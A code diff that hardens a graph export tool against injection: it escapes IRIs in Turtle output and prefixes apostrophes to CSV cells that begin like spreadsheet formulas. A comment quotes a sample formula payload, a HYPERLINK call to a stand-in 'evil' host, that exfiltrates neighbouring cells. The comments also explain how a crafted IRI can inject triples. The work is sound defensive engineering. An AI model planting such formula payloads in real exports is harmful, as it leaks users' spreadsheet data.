@@ -78,6 +78,38 @@ function iriSafe(local: string): string {
   return encodeURIComponent(local);
 }
 
+/**
+ * Characters an IRIREF (`<...>`) may not contain: Turtle forbids
+ * `<>"{}|^\` and backtick outright, plus everything at or below U+0020.
+ * A `>` or a newline inside the brackets does not produce a malformed
+ * document, it produces a DIFFERENT one, which is the whole attack.
+ */
+// eslint-disable-next-line no-control-regex -- the U+0000..U+0020 range is the point
+const IRI_FORBIDDEN = /[\u0000-\u0020<>"{}|^`\\]/g;
+/** Scheme prefix. A relative IRI would silently resolve against BASE. */
+const ABSOLUTE_IRI = /^[A-Za-z][A-Za-z0-9+.-]*:/;
+
+/**
+ * A provenance value as an IRIREF body, or null if it is not an IRI.
+ *
+ * `provenance_iri` is a node PROPERTY, so it arrives from an adapter
+ * response or an imported document: data this toolkit treats as
+ * external everywhere else. It used to be stringified straight into
+ * `<...>`, so a value ending the bracket and opening its own subject
+ * wrote attacker-chosen triples into the .ttl an analyst then loads
+ * into a triplestore. Percent-escaping keeps the value addressable
+ * while confining it to one term.
+ */
+function turtleIri(value: unknown): string | null {
+  const raw = String(value);
+  if (!ABSOLUTE_IRI.test(raw)) return null;
+  return raw.replace(
+    IRI_FORBIDDEN,
+    (c) =>
+      `%${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(2, "0")}`,
+  );
+}
+
 function turtleLiteral(value: unknown): string {
   if (typeof value === "number" && Number.isFinite(value)) {
     return Number.isInteger(value) ? `${value}` : `${value}`;
@@ -115,7 +147,16 @@ export function exportSubgraphTurtle(
     for (const [key, value] of Object.entries(n.properties)) {
       if (key === "name" || value === undefined || value === null) continue;
       if (key === "provenance_iri") {
-        lines.push(`${subject} prov:wasDerivedFrom <${String(value)}> .`);
+        const iri = turtleIri(value);
+        // Reported in band rather than dropped in silence: this file is
+        // read by a person, and lineage that vanished is worth a line.
+        // The subject is already escaped, so the comment cannot break
+        // out of itself; the value is deliberately not echoed.
+        lines.push(
+          iri === null
+            ? `# omitted prov:wasDerivedFrom for ${subject}: provenance_iri is not an absolute IRI`
+            : `${subject} prov:wasDerivedFrom <${iri}> .`,
+        );
         continue;
       }
       lines.push(
@@ -144,10 +185,34 @@ export function exportSubgraphJson(
 
 // ── CSV ──────────────────────────────────────────────────────────────
 
+/**
+ * Leading characters a spreadsheet reads as the start of a formula
+ * rather than as text, tab and CR included.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+/** A plain number, which is data and must not be quoted into text. */
+const NUMERIC = /^-?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;
+
+/**
+ * A CSV cell, escaped for the delimiter AND for the spreadsheet.
+ *
+ * Ids, types and property values come from adapter responses and
+ * imported documents, and this module's docstring names the
+ * spreadsheet as the intended consumer, so the dangerous sink is the
+ * designed one: `=HYPERLINK("https://evil/"&A2,"x")` exfiltrates
+ * neighbouring cells on click. A leading apostrophe is the standard
+ * guard; Excel, LibreOffice and Sheets all read the rest as text.
+ *
+ * Negative numbers are exempt. `-5` is data, and quoting it into
+ * `'-5` would break the arithmetic this export exists to enable, so
+ * the guard applies only to leading characters that do not begin a
+ * plain number. `-1+1` is not one, and is guarded.
+ */
 function csvCell(value: unknown): string {
   if (value === undefined || value === null) return "";
-  const s = typeof value === "object" ? JSON.stringify(value) : String(value);
-  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  let s = typeof value === "object" ? JSON.stringify(value) : String(value);
+  if (FORMULA_LEAD.test(s) && !NUMERIC.test(s)) s = `'${s}`;
+  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
 export function exportSubgraphCsv(
